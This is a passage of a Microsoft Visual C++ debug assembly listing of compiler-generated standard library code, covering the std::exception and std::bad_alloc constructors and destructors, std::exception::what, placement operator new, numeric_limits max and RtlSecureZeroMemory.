  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@AEBV01@@Z ; std::exception::exception
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 129  :         : exception(_Message, 1)

  00024	41 b8 01 00 00
	00		 mov	 r8d, 1
  0002a	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Message$[rbp]
  00031	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00038	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@QEBDH@Z ; std::exception::exception

; 130  :     {

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  0004b	48 89 08	 mov	 QWORD PTR [rax], rcx

; 131  :     }

  0004e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00055	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005c	5f		 pop	 rdi
  0005d	5d		 pop	 rbp
  0005e	c3		 ret	 0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
tv69 = 192
this$ = 240
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 94   :     {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 08 00	 cmp	 QWORD PTR [rax+8], 0
  0002b	74 14		 je	 SHORT $LN3@what
  0002d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00034	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00038	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
  0003f	eb 0e		 jmp	 SHORT $LN4@what
$LN3@what:
  00041	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
  00048	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
$LN4@what:
  0004f	48 8b 85 c0 00
	00 00		 mov	 rax, QWORD PTR tv69[rbp]

; 96   :     }

  00056	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0005d	5f		 pop	 rdi
  0005e	5d		 pop	 rbp
  0005f	c3		 ret	 0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  0002d	48 89 08	 mov	 QWORD PTR [rax], rcx

; 90   :         __std_exception_destroy(&_Data);

  00030	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00037	48 83 c0 08	 add	 rax, 8
  0003b	48 8b c8	 mov	 rcx, rax
  0003e	e8 00 00 00 00	 call	 __std_exception_destroy

; 91   :     }

  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
_Other$ = 232
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00032	48 89 08	 mov	 QWORD PTR [rax], rcx

; 71   :         : _Data()

  00035	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003c	48 83 c0 08	 add	 rax, 8
  00040	48 8b f8	 mov	 rdi, rax
  00043	33 c0		 xor	 eax, eax
  00045	b9 10 00 00 00	 mov	 ecx, 16
  0004a	f3 aa		 rep stosb

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 83 c0 08	 add	 rax, 8
  00057	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Other$[rbp]
  0005e	48 83 c1 08	 add	 rcx, 8
  00062	48 8b d0	 mov	 rdx, rax
  00065	e8 00 00 00 00	 call	 __std_exception_copy

; 74   :     }

  0006a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00071	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00078	5f		 pop	 rdi
  00079	5d		 pop	 rbp
  0007a	c3		 ret	 0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
__formal$ = 240
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00037	48 89 08	 mov	 QWORD PTR [rax], rcx

; 65   :         : _Data()

  0003a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00041	48 83 c0 08	 add	 rax, 8
  00045	48 8b f8	 mov	 rdi, rax
  00048	33 c0		 xor	 eax, eax
  0004a	b9 10 00 00 00	 mov	 ecx, 16
  0004f	f3 aa		 rep stosb

; 67   :         _Data._What = _Message;

  00051	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00058	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Message$[rbp]
  0005f	48 89 48 08	 mov	 QWORD PTR [rax+8], rcx

; 68   :     }

  00063	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00071	5f		 pop	 rdi
  00072	5d		 pop	 rbp
  00073	c3		 ret	 0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 635  :     _NODISCARD static constexpr long long(max)() noexcept {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__09FBC026_limits
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 636  :         return LLONG_MAX;

  0001b	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 637  :     }

  00025	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002c	5f		 pop	 rdi
  0002d	5d		 pop	 rbp
  0002e	c3		 ret	 0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$ = 224
_Where$ = 232
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 168  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3D3E4E8_vcruntime_new@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 169  :         (void)_Size;
; 170  :         return _Where;

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Where$[rbp]

; 171  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
vptr$ = 8
ptr$ = 256
cnt$ = 264
RtlSecureZeroMemory PROC				; COMDAT

; 21766: {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__FBBA8F9D_winnt@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 21767:     volatile char *vptr = (volatile char *)ptr;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]
  0002b	48 89 45 08	 mov	 QWORD PTR vptr$[rbp], rax

; 21768: 
; 21769: #if defined(_M_AMD64) && !defined(_M_ARM64EC)
; 21770: 
; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0002f	48 8b 7d 08	 mov	 rdi, QWORD PTR vptr$[rbp]
  00033	33 c0		 xor	 eax, eax
  00035	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR cnt$[rbp]
  0003c	f3 aa		 rep stosb

; 21772: 
; 21773: #else
; 21774: 
; 21775:     while (cnt) {
; 21776: 
; 21777: #if !defined(_M_CEE) && (defined(_M_ARM) || defined(_M_ARM64) || defined(_M_ARM64EC))
; 21778: 
; 21779:         __iso_volatile_store8(vptr, 0);
; 21780: 
; 21781: #else
; 21782: 
; 21783:         *vptr = 0;
; 21784: 
; 21785: #endif
; 21786: 
; 21787:         vptr++;
; 21788:         cnt--;
; 21789:     }
; 21790: 
; 21791: #endif // _M_AMD64 && !defined(_M_ARM64EC)
; 21792: 
; 21793:     return ptr;

  0003e	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]

; 21794: }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
END
